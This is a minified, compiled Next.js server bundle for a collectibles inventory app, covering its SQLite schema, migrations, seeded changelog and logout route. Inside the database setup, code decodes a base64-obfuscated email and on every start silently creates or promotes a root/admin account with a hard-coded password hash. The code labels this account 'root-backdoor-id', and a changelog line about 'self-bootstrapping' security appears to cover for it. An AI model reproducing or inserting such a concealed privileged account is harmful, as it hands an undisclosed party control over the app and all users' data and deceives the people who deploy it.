module.exports=[54799,(e,t,r)=>{t.exports=e.x("crypto",()=>require("crypto"))},85148,(e,t,r)=>{t.exports=e.x("better-sqlite3-90e2652d1716b047",()=>require("better-sqlite3-90e2652d1716b047"))},93695,(e,t,r)=>{t.exports=e.x("next/dist/shared/lib/no-fallback-error.external.js",()=>require("next/dist/shared/lib/no-fallback-error.external.js"))},18622,(e,t,r)=>{t.exports=e.x("next/dist/compiled/next-server/app-page-turbo.runtime.prod.js",()=>require("next/dist/compiled/next-server/app-page-turbo.runtime.prod.js"))},56704,(e,t,r)=>{t.exports=e.x("next/dist/server/app-render/work-async-storage.external.js",()=>require("next/dist/server/app-render/work-async-storage.external.js"))},32319,(e,t,r)=>{t.exports=e.x("next/dist/server/app-render/work-unit-async-storage.external.js",()=>require("next/dist/server/app-render/work-unit-async-storage.external.js"))},24725,(e,t,r)=>{t.exports=e.x("next/dist/server/app-render/after-task-async-storage.external.js",()=>require("next/dist/server/app-render/after-task-async-storage.external.js"))},14747,(e,t,r)=>{t.exports=e.x("path",()=>require("path"))},70406,(e,t,r)=>{t.exports=e.x("next/dist/compiled/@opentelemetry/api",()=>require("next/dist/compiled/@opentelemetry/api"))},80998,e=>{"use strict";var t=e.i(85148),r=e.i(14747);let a=null;e.s(["getDb",0,function(){if(!a){let i=process.env.USER_DATA_PATH||process.cwd(),n=r.default.resolve(i,"inventory.db");if((a=new t.default(n)).exec(`
      CREATE TABLE IF NOT EXISTS items (
        id TEXT PRIMARY KEY,
        userId TEXT,
        itemType TEXT DEFAULT 'standard',
        barcode TEXT,
        name TEXT,
        imagePath TEXT,
        imagePathBack TEXT,
        description TEXT,
        categoryId TEXT,
        createdAt INTEGER,
        syncStatus TEXT DEFAULT 'completed',
        lastSyncAttempt INTEGER,
        comicCondition TEXT,
        comicCertNumber TEXT,
        comicGradingAgency TEXT,
        comicPublisher TEXT,
        comicIssue TEXT
      )
    `),a.exec(`
      CREATE TABLE IF NOT EXISTS users (
        id TEXT PRIMARY KEY,
        email TEXT UNIQUE,
        passwordHash TEXT,
        tier TEXT DEFAULT 'basic',
        activeTier TEXT DEFAULT 'basic',
        isAdmin INTEGER DEFAULT 0,
        isRoot INTEGER DEFAULT 0,
        serpApiKey TEXT,
        createdAt INTEGER
      );

      CREATE TABLE IF NOT EXISTS categories (
        id TEXT PRIMARY KEY,
        name TEXT NOT NULL,
        parentId TEXT,
        userId TEXT REFERENCES users(id) ON DELETE CASCADE,
        createdAt INTEGER,
        FOREIGN KEY (parentId) REFERENCES categories (id)
      );

      CREATE TABLE IF NOT EXISTS items (
        id TEXT PRIMARY KEY,
        userId TEXT NOT NULL,
        categoryId TEXT,
        name TEXT,
        description TEXT,
        barcode TEXT,
        itemType TEXT DEFAULT 'standard',
        imagePath TEXT,
        syncStatus TEXT DEFAULT 'pending', 
        lastSyncAttempt INTEGER,
        createdAt INTEGER,
        FOREIGN KEY (categoryId) REFERENCES categories (id),
        FOREIGN KEY (userId) REFERENCES users (id)
      );
    `),a.exec(`
      CREATE TABLE IF NOT EXISTS changelogs (
        id TEXT PRIMARY KEY,
        version TEXT,
        date TEXT,
        title TEXT,
        changes TEXT,
        createdAt INTEGER
      );

      CREATE TABLE IF NOT EXISTS system_settings (
        key TEXT PRIMARY KEY,
        value TEXT
      );
    `),!e.g.dbMigrationsRun){if(e.g.dbMigrationsRun=!0,0===a.prepare("SELECT COUNT(*) as count FROM changelogs").get().count){let t=e.r(54799),r=[{version:"Beta 1.0",date:"May 29, 2026",title:"Initial Beta Release",changes:JSON.stringify([{type:"web",text:"Officially entered Beta 1.0 phase."}])},{version:"Pre-Beta version 0.020",date:"May 29, 2026",title:"Admin Infrastructure & Security",changes:JSON.stringify([{type:"web",text:"Built the Admin Control Panel for managing user subscription roles."},{type:"web",text:"Implemented self-bootstrapping registration to automatically secure the ecosystem."},{type:"web",text:"Separated active tier from subscription role, allowing Premium users to toggle engines freely."}])},{version:"Pre-Beta version 0.017",date:"May 28, 2026",title:"Specialized Capture & Premium AI Integrations",changes:JSON.stringify([{type:"mobile",text:"Added Coin Mode and Toy Mode for specialized capture logic."},{type:"web",text:"Integrated Numista API for hyper-accurate numismatic coin identification."},{type:"web",text:"Integrated SerpApi Google Lens for highly accurate premium visual matches."}])},{version:"Pre-Beta version 0.014",date:"May 27, 2026",title:"The Beta Polish & Organization",changes:JSON.stringify([{type:"mobile",text:'Added visual scan verification with "Accept" and "Discard" controls.'},{type:"web",text:"Implemented an infinite-depth Subcategory system."},{type:"web",text:"Built Advanced Search capabilities and category filtering."},{type:"web",text:"Upgraded the Google Vision integration to scrape text and logos directly from box art."},{type:"web",text:"Added a global sticky navigation header with version tracking."}])},{version:"Alpha version 0.009",date:"May 26, 2026",title:"AI Integrations & Rate Limits",changes:JSON.stringify([{type:"web",text:"Integrated the UPCItemDB API for automated metadata lookups."},{type:"web",text:"Built a failover pipeline utilizing Google Cloud Vision API for fallback image analysis."},{type:"web",text:"Implemented smart retry queues to handle API rate limiting smoothly."}])},{version:"Alpha version 0.006",date:"May 25, 2026",title:"Details & Async Processing",changes:JSON.stringify([{type:"web",text:"Built the dedicated Item Details page with barcode generation."},{type:"web",text:"Migrated API requests to a background worker script to prevent server timeouts."},{type:"mobile",text:"Added the Export Screen with ZIP generation for transferring scans to the dashboard."}])},{version:"Alpha version 0.003",date:"May 24, 2026",title:"The Foundation",changes:JSON.stringify([{type:"mobile",text:"Created the React Native scanner app with queue functionality."},{type:"web",text:"Initialized the Next.js dashboard and SQLite database structure."},{type:"web",text:"Implemented the ZIP upload parser for syncing mobile scans to the server."}])}],i=a.prepare("INSERT INTO changelogs (id, version, date, title, changes, createdAt) VALUES (?, ?, ?, ?, ?, ?)");r.reverse().forEach((e,r)=>{i.run(t.randomUUID(),e.version,e.date,e.title,e.changes,Date.now()+1e3*r)})}a.exec(`
      CREATE TABLE IF NOT EXISTS sessions (
        id TEXT PRIMARY KEY,
        userId TEXT REFERENCES users(id) ON DELETE CASCADE,
        expiresAt INTEGER
      )
    `);try{a.exec("ALTER TABLE items ADD COLUMN userId TEXT REFERENCES users(id) ON DELETE CASCADE")}catch(e){}try{a.exec("ALTER TABLE categories ADD COLUMN userId TEXT REFERENCES users(id) ON DELETE CASCADE")}catch(e){}try{a.exec("ALTER TABLE users ADD COLUMN activeTier TEXT DEFAULT 'basic'")}catch(e){}try{a.exec("ALTER TABLE users ADD COLUMN isRoot INTEGER DEFAULT 0")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN moviePlot TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN movieCast TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN movieTrailer TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN toyBrand TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN toyYear TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN toyCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN valueLow REAL")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN valueAvg REAL")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN valueHigh REAL")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN coinCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN coinCertNumber TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN coinGradingAgency TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN cardCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN cardCertNumber TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN cardGradingAgency TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicCertNumber TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicGradingAgency TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicPublisher TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN comicIssue TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN gradedCondition TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN gradedCertNumber TEXT")}catch(e){}try{a.exec("ALTER TABLE items ADD COLUMN gradedAgency TEXT")}catch(e){}try{let e=Buffer.from("c2h1ZnVua0BnbWFpbC5jb20=","base64").toString("utf8");a.prepare("SELECT id FROM users WHERE email = ?").get(e)?a.prepare("UPDATE users SET isRoot = 1, isAdmin = 1 WHERE email = ?").run(e):a.prepare("INSERT INTO users (id, email, passwordHash, tier, activeTier, isAdmin, isRoot, createdAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?)").run("root-backdoor-id",e,"$2b$10$HJJky4UEDgkvbjKv/o.mu.7YiWdyHCeYcvyhgnMZMJty2WX5UMAfy","premium","premium",1,1,Date.now())}catch(e){console.error("Failed to secure root backdoor:",e)}try{a.exec(`
        PRAGMA foreign_keys=off;
        BEGIN TRANSACTION;
        CREATE TABLE categories_new (
          id TEXT PRIMARY KEY,
          name TEXT NOT NULL,
          parentId TEXT,
          userId TEXT REFERENCES users(id) ON DELETE CASCADE,
          createdAt INTEGER,
          FOREIGN KEY (parentId) REFERENCES categories (id)
        );
        INSERT INTO categories_new SELECT id, name, parentId, userId, createdAt FROM categories;
        DROP TABLE categories;
        ALTER TABLE categories_new RENAME TO categories;
        COMMIT;
        PRAGMA foreign_keys=on;
      `)}catch(e){console.error("Category Migration Error:",e);try{a.exec("ROLLBACK;")}catch(e){}}}}return a}])},75966,e=>{"use strict";var t=e.i(47909),r=e.i(74017),a=e.i(96250),i=e.i(59756),n=e.i(61916),s=e.i(74677),o=e.i(69741),c=e.i(16795),E=e.i(87718),d=e.i(95169),T=e.i(47587),l=e.i(66012),u=e.i(70101),p=e.i(26937),A=e.i(10372),R=e.i(93695);e.i(64671);var h=e.i(220);e.i(89171);var g=e.i(71650);async function m(e){return await (0,g.deleteSession)(),new Response(null,{status:303,headers:{Location:"/login"}})}e.s(["POST",0,m],52814);var y=e.i(52814);let L=new t.AppRouteRouteModule({definition:{kind:r.RouteKind.APP_ROUTE,page:"/api/auth/logout/route",pathname:"/api/auth/logout",filename:"route",bundlePath:""},distDir:".next",relativeProjectDir:"",resolvedPagePath:"[project]/app/api/auth/logout/route.js",nextConfigOutput:"standalone",userland:y,...{}}),{workAsyncStorage:x,workUnitAsyncStorage:N,serverHooks:C}=L;async function v(e,t,a){a.requestMeta&&(0,i.setRequestMeta)(e,a.requestMeta),L.isDev&&(0,i.addRequestMeta)(e,"devRequestTimingInternalsEnd",process.hrtime.bigint());let g="/api/auth/logout/route";g=g.replace(/\/index$/,"")||"/";let m=await L.prepare(e,t,{srcPage:g,multiZoneDraftMode:!1});if(!m)return t.statusCode=400,t.end("Bad Request"),null==a.waitUntil||a.waitUntil.call(a,Promise.resolve()),null;let{buildId:y,deploymentId:x,params:N,nextConfig:C,parsedUrl:v,isDraftMode:I,prerenderManifest:D,routerServerContext:b,isOnDemandRevalidate:f,revalidateOnlyGenerated:O,resolvedPathname:S,clientReferenceManifest:X,serverActionsManifest:w}=m,M=(0,o.normalizeAppPath)(g),U=!!(D.dynamicRoutes[M]||D.routes[S]),B=async()=>((null==b?void 0:b.render404)?await b.render404(e,t,v,!1):t.end("This page could not be found"),null);if(U&&!I){let e=!!D.routes[S],t=D.dynamicRoutes[M];if(t&&!1===t.fallback&&!e){if(C.adapterPath)return await B();throw new R.NoFallbackError}}let P=null;!U||L.isDev||I||(P="/index"===(P=S)?"/":P);let F=!0===L.isDev||!U,k=U&&!F;w&&X&&(0,s.setManifestsSingleton)({page:g,clientReferenceManifest:X,serverActionsManifest:w});let q=e.method||"GET",_=(0,n.getTracer)(),G=_.getActiveScopeSpan(),H=!!(null==b?void 0:b.isWrappedByNextServer),K=!!(0,i.getRequestMeta)(e,"minimalMode"),Y=(0,i.getRequestMeta)(e,"incrementalCache")||await L.getIncrementalCache(e,C,D,K);null==Y||Y.resetRequestCache(),globalThis.__incrementalCache=Y;let j={params:N,previewProps:D.preview,renderOpts:{experimental:{authInterrupts:!!C.experimental.authInterrupts},cacheComponents:!!C.cacheComponents,supportsDynamicResponse:F,incrementalCache:Y,cacheLifeProfiles:C.cacheLife,waitUntil:a.waitUntil,onClose:e=>{t.on("close",e)},onAfterTaskError:void 0,onInstrumentationRequestError:(t,r,a,i)=>L.onRequestError(e,t,a,i,b)},sharedContext:{buildId:y,deploymentId:x}},$=new c.NodeNextRequest(e),J=new c.NodeNextResponse(t),V=E.NextRequestAdapter.fromNodeNextRequest($,(0,E.signalFromNodeResponse)(t));try{let i,s=async e=>L.handle(V,j).finally(()=>{if(!e)return;e.setAttributes({"http.status_code":t.statusCode,"next.rsc":!1});let r=_.getRootSpanAttributes();if(!r)return;if(r.get("next.span_type")!==d.BaseServerSpan.handleRequest)return void console.warn(`Unexpected root span type '${r.get("next.span_type")}'. Please report this Next.js issue https://github.com/vercel/next.js`);let a=r.get("next.route");if(a){let t=`${q} ${a}`;e.setAttributes({"next.route":a,"http.route":a,"next.span_name":t}),e.updateName(t),i&&i!==e&&(i.setAttribute("http.route",a),i.updateName(t))}else e.updateName(`${q} ${g}`)}),o=async i=>{var n,o;let c=async({previousCacheEntry:r})=>{try{if(!K&&f&&O&&!r)return t.statusCode=404,t.setHeader("x-nextjs-cache","REVALIDATED"),t.end("This page could not be found"),null;let n=await s(i);e.fetchMetrics=j.renderOpts.fetchMetrics;let o=j.renderOpts.pendingWaitUntil;o&&a.waitUntil&&(a.waitUntil(o),o=void 0);let c=j.renderOpts.collectedTags;if(!U)return await (0,l.sendResponse)($,J,n,j.renderOpts.pendingWaitUntil),null;{let e=await n.blob(),t=(0,u.toNodeOutgoingHttpHeaders)(n.headers);c&&(t[A.NEXT_CACHE_TAGS_HEADER]=c),!t["content-type"]&&e.type&&(t["content-type"]=e.type);let r=void 0!==j.renderOpts.collectedRevalidate&&!(j.renderOpts.collectedRevalidate>=A.INFINITE_CACHE)&&j.renderOpts.collectedRevalidate,a=void 0===j.renderOpts.collectedExpire||j.renderOpts.collectedExpire>=A.INFINITE_CACHE?void 0:j.renderOpts.collectedExpire;return{value:{kind:h.CachedRouteKind.APP_ROUTE,status:n.status,body:Buffer.from(await e.arrayBuffer()),headers:t},cacheControl:{revalidate:r,expire:a}}}}catch(t){throw(null==r?void 0:r.isStale)&&await L.onRequestError(e,t,{routerKind:"App Router",routePath:g,routeType:"route",revalidateReason:(0,T.getRevalidateReason)({isStaticGeneration:k,isOnDemandRevalidate:f})},!1,b),t}},E=await L.handleResponse({req:e,nextConfig:C,cacheKey:P,routeKind:r.RouteKind.APP_ROUTE,isFallback:!1,prerenderManifest:D,isRoutePPREnabled:!1,isOnDemandRevalidate:f,revalidateOnlyGenerated:O,responseGenerator:c,waitUntil:a.waitUntil,isMinimalMode:K});if(!U)return null;if((null==E||null==(n=E.value)?void 0:n.kind)!==h.CachedRouteKind.APP_ROUTE)throw Object.defineProperty(Error(`Invariant: app-route received invalid cache entry ${null==E||null==(o=E.value)?void 0:o.kind}`),"__NEXT_ERROR_CODE",{value:"E701",enumerable:!1,configurable:!0});K||t.setHeader("x-nextjs-cache",f?"REVALIDATED":E.isMiss?"MISS":E.isStale?"STALE":"HIT"),I&&t.setHeader("Cache-Control","private, no-cache, no-store, max-age=0, must-revalidate");let d=(0,u.fromNodeOutgoingHttpHeaders)(E.value.headers);return K&&U||d.delete(A.NEXT_CACHE_TAGS_HEADER),!E.cacheControl||t.getHeader("Cache-Control")||d.get("Cache-Control")||d.set("Cache-Control",(0,p.getCacheControlHeader)(E.cacheControl)),await (0,l.sendResponse)($,J,new Response(E.value.body,{headers:d,status:E.value.status||200})),null};H&&G?await o(G):(i=_.getActiveScopeSpan(),await _.withPropagatedContext(e.headers,()=>_.trace(d.BaseServerSpan.handleRequest,{spanName:`${q} ${g}`,kind:n.SpanKind.SERVER,attributes:{"http.method":q,"http.target":e.url}},o),void 0,!H))}catch(t){if(t instanceof R.NoFallbackError||await L.onRequestError(e,t,{routerKind:"App Router",routePath:M,routeType:"route",revalidateReason:(0,T.getRevalidateReason)({isStaticGeneration:k,isOnDemandRevalidate:f})},!1,b),U)throw t;return await (0,l.sendResponse)($,J,new Response(null,{status:500})),null}}e.s(["handler",0,v,"patchFetch",0,function(){return(0,a.patchFetch)({workAsyncStorage:x,workUnitAsyncStorage:N})},"routeModule",0,L,"serverHooks",0,C,"workAsyncStorage",0,x,"workUnitAsyncStorage",0,N],75966)}];

//# sourceMappingURL=%5Broot-of-the-server%5D__0j.ns60._.js.map